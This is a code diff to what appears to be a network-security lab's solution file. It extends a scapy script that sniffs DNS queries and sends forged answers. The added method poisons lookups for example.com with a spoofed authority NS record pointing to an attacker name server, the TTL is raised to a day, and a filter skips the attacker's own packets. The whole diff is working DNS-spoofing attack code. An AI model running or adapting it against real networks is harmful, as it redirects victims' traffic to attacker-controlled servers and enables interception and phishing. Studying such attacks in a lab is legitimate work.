@@ -33,7 +33,7 @@ class Task:
                             rrname=pkt[DNSQR].qname,
                             type="A",
                             rclass="IN",
-                            ttl=30,
+                            ttl=86400,
                             rdata="1.2.3.4",
                         ),
                     )
@@ -44,6 +44,47 @@ class Task:
         _ = sniff(
             iface=ATTACKER_IFACE,
             prn=spoof_dns,
+            filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
+        )
+
+    @staticmethod
+    def _3():
+
+        TARGET = "example.com"
+
+        def spoof_dns_ns(pkt):
+            if (
+                pkt.haslayer(DNS)
+                and pkt.haslayer(DNSQR)
+                and TARGET in pkt[DNSQR].qname.decode("utf-8")
+                and pkt[DNS].qr == 0
+            ):
+                print(f"Got DNS Query: {pkt[IP].summary()}")
+
+                resp = (
+                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
+                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
+                    / DNS(
+                        id=pkt[DNS].id,
+                        qr=1,
+                        aa=0,
+                        nscount=1,
+                        qd=pkt[DNS].qd,
+                        ns=DNSRR(
+                            rrname=pkt[DNSQR].qname,
+                            type="NS",
+                            rclass="IN",
+                            ttl=86400,
+                            rdata=ATTACKER_NS,
+                        ),
+                    )
+                )
+
+                send(resp)
+
+        _ = sniff(
+            iface=ATTACKER_IFACE,
+            prn=spoof_dns_ns,
             filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
         )
 
